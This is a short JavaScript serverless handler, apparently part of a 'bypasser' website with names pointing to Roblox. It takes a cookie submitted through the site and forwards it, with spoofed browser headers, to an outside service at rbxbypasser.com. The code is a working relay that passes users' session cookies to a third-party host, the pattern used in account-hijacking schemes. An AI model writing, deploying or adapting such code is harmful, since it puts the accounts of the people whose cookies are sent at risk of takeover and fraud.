export default async function handler(req, res) {
  // ===============================
  // 1️⃣ ALLOW YOUR WEBSITE
  // ===============================
  const WEBSITE = "https://vaultix-bypassers.vercel.app/"; // 🔴 CHANGE THIS

  // ===============================
  // 2️⃣ CORS (UNBLOCK WEBSITE)
  // ===============================
  res.setHeader("Access-Control-Allow-Origin", WEBSITE);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // ===============================
  // 3️⃣ PREFLIGHT
  // ===============================
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  try {
    // ===============================
    // 4️⃣ GET DATA FROM WEBSITE
    // ===============================
    const { cookie } = req.body || {};

    if (!cookie) {
      return res.status(400).json({
        success: false,
        error: "Missing cookie"
      });
    }

    // ===============================
    // 5️⃣ CALL ORIGINAL VERIFY API
    // ===============================
    const response = await fetch(
      "https://rbxbypasser.com/api/verify",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",

          // 🔥 COOKIE USED BY ORIGINAL API
          "Cookie": cookie,

          // 🔥 REQUIRED HEADERS
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
          "Accept": "application/json",
          "Referer": "https://rbxbypasser.com/"
        }
      }
    );

    const data = await response.text();

    // ===============================
    // 6️⃣ SET COOKIE FOR WEBSITE
    // ===============================
    res.setHeader(
      "Set-Cookie",
      "session=verified; Path=/; HttpOnly; Secure; SameSite=None"
    );

    // ===============================
    // 7️⃣ RETURN VERIFY RESULT
    // ===============================
    return res.status(200).send(data);

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: "Verify API failed"
    });
  }
  }
